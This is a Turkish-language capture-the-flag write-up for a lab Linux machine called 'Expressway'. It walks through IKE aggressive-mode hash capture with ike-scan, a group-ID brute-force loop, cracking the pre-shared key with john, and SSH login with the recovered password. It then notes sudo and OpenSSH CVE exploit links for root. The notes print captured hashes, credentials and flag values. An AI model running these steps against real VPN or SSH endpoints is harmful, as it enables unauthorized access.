
# Expressway Easy Linux Machine

# IP=`10.10.11.87`

----------------------------------------------------------------------------------------------------

# Enum

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

## ports = `22`
sadece ssh?

## udp scan
eğer çok bişi gelmediyse bir udp scan yapılır.
```bash
500/udp   open          isakmp?
```
## ports = `500`

## ssh cve
> https://github.com/acrono/cve-2024-6387-poc/blob/main/7etsuo-regreSSHion.c
çalışmadı

bu da vuln checker
```bash
python3 CVE-2024-6387_Check.py $IP
 ____   ___________   ____  /   _____//   _____//   |   \|__| ____   ____
\_  __ \_/ __ \ / ___\_  __ \_/ __ \ \_____  \ \_____  \/    ~    \  |/  _ \ /    \
 |  | \/\  ___// /_/  >  | \/\  ___/ /        \/        \    Y    /  (  <_> )   |  \
 |__|    \___  >___  /|__|    \___  >_______  /_______  /\___|_  /|__|\____/|___|  /
             \/_____/             \/        \/        \/       \/                \/
    CVE-2024-6387 Vulnerability Checker
    v0.8 / Alex Hagenah / @xaitax / ah@primepage.de
Progress: 1/1 checks performed
🛡️ Servers not vulnerable: 0
🚨 Servers likely vulnerable: 1
   [+] Server at 10.10.11.87 (running SSH-2.0-OpenSSH_10.0p2 Debian-8)
```

> https://github.com/Karmakstylez/CVE-2024-6387/tree/production
bu tool cve yok diyor. zaten bitürlü olmadı. şimdilik durdun

----------------------------------------------------------------------------------------------------

# udp - port 500 - IPsec / Internet Security Association and Key Management Protocol
> https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting

IPsec networkler arasında şifreleme yapar
* LAN to LAN
* Remote Access
olarak çalışır.
güvenli connection oluşturmak için IKE (Internet Key Exchange) kullanılr.
şirket ağına forticlient ile bağlanırken arkada IKE vardır.

## Neden Pentesting'de Önemli?
1. Çok Yaygın
* Binlerce şirkette kullanılıyor → geniş saldırı yüzeyi
2. Genelde Yanlış Yapılandırılmış
* Zayıf şifreler (PSK)
* Eski algoritmalar (3DES, MD5)
* Aggressive Mode açık (hash sızıntısı)

## örnek saldırı senaryosu:
1. ike-scan ile tarama
2. Aggressive Mode'dan PSK hash yakala
3. Hashcat ile kır (Password: CompanyVPN123)
4. strongSwan ile bağlan
5. İnternal network'e eriş

1) Finding a valid transformation
IKE sunucusu ile konuşmak için
```bash
ike-scan -M $IP
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Main Mode Handshake returned
	HDR=(CKY-R=9aec0dd63fd09d5b)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.078 seconds (12.79 hosts/sec).  1 returned handshake; 0 returned notify

```
`-M` : outputu daha güzel gösteriyor
`Auth=PSK`: vpn preshared key ile config edilmiş. (pentester için iyi bişi)
`1 returned handshake; 0 returned notify` : target IPsec için config edildi ve IKE yapmak için bekliyo.

2) brute-force a little bit to find a valid transformation:
> https://raw.githubusercontent.com/isaudits/scripts/refs/heads/master/iker.py

```bash
Results:
--------

Resuls for IP b'10.10.11.87':

[+] The IKE service could be discovered (Risk: LOW)
[+] IKE v2 is supported (Risk: Informational)

Resuls for IP b'HDR=(CKY-R=5d99b09f1e658da7)':

[+] The IKE service could be discovered (Risk: LOW)

Resuls for IP b'SA=(Enc=3DES':

[+] The IKE service could be discovered (Risk: LOW)

Resuls for IP b'VID=09002689dfd6b712':

[+] The IKE service could be discovered (Risk: LOW)

Resuls for IP b'VID=afcad71368a1f1c96b8696fc77570100':

[+] The IKE service could be discovered (Risk: LOW)
iker finished at Sun, 09 Nov 2025 03:45:07 +0000
```
`3DES` var 1990lardan kalma:
bu tablodan algıladığımız sistemin güçlü bir algoritma kullanmadığıdır.

3) Finding the correct ID (group name)
bunu bulursak aggressive scan yapabiliriz.

### Bruteforcing ID with ike-scan
başta fakeID ile denicez.
```bash
ike-scan -P -M -A -n fakeID $IP
 
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned
	HDR=(CKY-R=38f696379228fbd3)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
1fe42041aa6dfa9d83ac510f4323f8f24ee471efbd263516b6a1aa78ade93819d124399976d3f7b5320ff445106784488fd8f80a3f09713d324f9ec532b0014cd4d86fe6975576ecb62e239ea5ed54c91a0753609750121f995c11a169ea530f5e3fc397d9ef5e921752c2295ea337fa421b9b40da05dd19bd48a3bbf3e3f682:7b823f9f6dfeb6bbde4a7abf4eeb3528d3fd331d7944646ec81563494d6955f976a1fd612541e0bc1cef67e3c6b2630b33bed25f30914aa49ee244f93608f3887a845bc936ee7cb45321c3a8864934b5998176189e989c6ac470f1fa8023b7e761988b2c02a4e3d567bde85c95040fcb15fdcb83a77174b914cb126a610e69c4:38f696379228fbd3:4b026fbc475fe636:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:c2aab0f157a0a760dd08f34855e99b1c48e794ff:87b790f02ed90f3dc16e02885a1a65486960fc732cfebfeb3baee77d92959e05:93a7f2113d0d2fbd7436e3ea19a18b59e009d9a7
Ending ike-scan 1.9.6: 1 hosts scanned in 0.071 seconds (14.03 hosts/sec).  1 returned handshake; 0 returned notify

```
> eğer hash dönmezze (maalesef) : bruteforce çalışacak. ama zaten hashi elde ettik group id'ye sonra bakıcaz.
> eğer hash dönerse (şimdi olduğu gibi): bruteforce çalışmayabilir.


bruteforce ama dediğim gibi birden fazla sonuç geliyor ve reliable değil :(
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line $IP) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/seclists/Miscellaneous/ike-groupid.txt
```
bir group id elde edemedim ama devam.

4) aggressive scan : hash leak edilir. amaç hashi ele geçirmek

```bash
ike-scan -A $IP                              
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned HDR=(CKY-R=c2b8ab23bc43232f) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
```

## ike valid user: `ike@expressway.htb`

----------------------------------------------------------------------------------------------------

# hash cracking
```bash
ikescan2john ike-hash.txt > ike-hash2john.txt
john ike-hash2john.txt --wordlist=/usr/share/wordlists/rockyou.txt 
freakingrockstarontheroad (?)     
```

## IKE password : `freakingrockstarontheroad`

----------------------------------------------------------------------------------------------------

# ssh - ike

## ssh creds: `ike:freakingrockstarontheroad`
username ve password bulduk. ssh çalıştı.

# user.txt : `21bdf7c4867d3760cfa3dae9fce01fc2`

## proxy id ?
```bash
id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```
proxy sunucusu ile ilgili işlem ypaılabiliyormuşum
```bash
# Hangi proxy servisleri çalışıyor?
ps aux | grep -i proxy

# Proxy config dosyaları var mı?
ls -la /etc/squid* 2>/dev/null
ls -la /etc/tinyproxy* 2>/dev/null
cat /etc/environment
``` 

## /etc/squid
var. 
```bash
/usr/sbin/squid -v
Squid Cache: Version 7.1
```

## Information Disclosure in Squid: `CVE-2025-62168`
squid 7.2'ye kadar vuln varmış.
çok fazla article var ama poc bulamadım. dursun
ve zaten infodisc ama gerçi nasıl olcak bilmiyom da root password veya id_rsa disc?

## sudo 1.9.17: CVE-2025-32463
> https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/tree/main

# root.txt : `81a4962703f1ef1d3349ee680034850c`

----------------------------------------------------------------------------------------------------


----------------------------------------------------------------------------------------------------